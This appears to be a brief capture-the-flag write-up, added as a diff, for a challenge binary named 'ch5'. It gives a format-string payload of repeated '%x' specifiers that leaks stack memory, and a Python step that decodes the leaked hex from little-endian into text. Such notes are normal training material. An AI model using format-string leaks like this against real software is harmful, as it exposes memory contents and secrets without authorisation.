@@ -1,0 +1,12 @@
+Read the file:
+
+./ch5 "`python -c 'print "A" * 4 + "%x " * 7 + "%x "'`"
+
+
+Decode hex to ascii, flip from little endianness.
+
+>>> "44434241".decode('hex')[::-1]
+'ABCD'
+
+
+
